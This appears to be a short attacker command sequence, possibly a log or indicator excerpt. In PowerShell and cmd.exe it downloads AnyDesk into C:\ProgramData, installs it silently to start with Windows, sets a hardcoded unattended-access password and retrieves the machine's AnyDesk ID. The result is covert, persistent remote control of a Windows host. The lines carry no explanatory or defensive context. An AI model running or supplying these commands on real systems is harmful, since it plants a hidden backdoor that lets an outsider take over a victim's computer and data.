(new-object System.Net.WebClient).DownloadFile("http://download.anydesk.com/AnyDesk.exe", "C:\ProgramData\AnyDesk.exe")
cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent
cmd.exe /c echo J9kzQ2Y0qO | C:\ProgramData\anydesk.exe --set-password
cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id